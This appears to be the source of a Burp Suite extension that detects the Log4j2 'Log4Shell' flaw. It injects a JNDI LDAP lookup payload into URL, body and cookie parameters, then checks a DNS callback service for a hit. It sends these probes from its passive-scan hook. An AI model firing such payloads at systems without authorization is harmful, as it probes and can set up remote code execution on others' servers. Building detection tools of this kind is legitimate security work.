package burp.scanner;

import burp.*;
import burp.dnslog.IDnslog;
import burp.dnslog.platform.Ceye;
import burp.dnslog.platform.DnslogCN;
import burp.utils.Utils;

import java.util.ArrayList;
import java.util.List;

public class Log4j2Scanner implements IScannerCheck {
    private BurpExtender parent;
    private IExtensionHelpers helper;
    private IDnslog dnslog = new Ceye();


    public Log4j2Scanner(final BurpExtender newParent) {
        this.parent = newParent;
        this.helper = newParent.helpers;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        IRequestInfo req = this.parent.helpers.analyzeRequest(baseRequestResponse);
        List<IScanIssue> issues = new ArrayList<>();
        byte[] rawRequest = baseRequestResponse.getRequest();
        for (IParameter param :
                req.getParameters()) {
            try {
                String tmpDomain = dnslog.getNewDomain();
                byte[] tmpRawRequest = rawRequest;
                String exp = "${jndi:ldap://" + tmpDomain + "/" + Utils.GetRandomNumber(100000, 999999) + "}";
                boolean hasModify = false;
                switch (param.getType()) {
                    case IParameter.PARAM_URL:
                    case IParameter.PARAM_BODY:
                    case IParameter.PARAM_COOKIE:
                        exp = helper.urlEncode(exp);
                        IParameter newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
                        tmpRawRequest = parent.helpers.updateParameter(rawRequest, newParam);
                        hasModify = true;
                        break;
                    case IParameter.PARAM_JSON:
                    case IParameter.PARAM_XML:
                    case IParameter.PARAM_MULTIPART_ATTR:
                    case IParameter.PARAM_XML_ATTR:
                        //unsupported.
                }
                if (hasModify) {
                    IHttpRequestResponse tmpReq = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
                    tmpReq.getResponse();
                    boolean hasIssue = dnslog.CheckResult(tmpDomain);
                    if (hasIssue) {
                        issues.add(new Log4j2Issue(baseRequestResponse.getHttpService(),
                                req.getUrl(),
                                new IHttpRequestResponse[]{baseRequestResponse, tmpReq},
                                "Log4j2 RCE Detected",
                                String.format("Vulnerable param is \"%s\" in %s.", param.getName(), getTypeName(param.getType())),
                                "High"));
                    }
                }
            } catch (Exception ex) {
                System.out.println(ex);
            }
        }
        return issues;
    }

    private String getTypeName(int typeId) {
        switch (typeId) {
            case IParameter.PARAM_URL:
                return "URL";
            case IParameter.PARAM_BODY:
                return "Body";
            case IParameter.PARAM_COOKIE:
                return "Cookie";
            case IParameter.PARAM_JSON:
                return "Body-json";
            case IParameter.PARAM_XML:
                return "Body-xml";
            case IParameter.PARAM_MULTIPART_ATTR:
                return "Body-multipart";
            case IParameter.PARAM_XML_ATTR:
                return "Body-xml-attr";
            default:
                return "unknown";
        }
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }
}
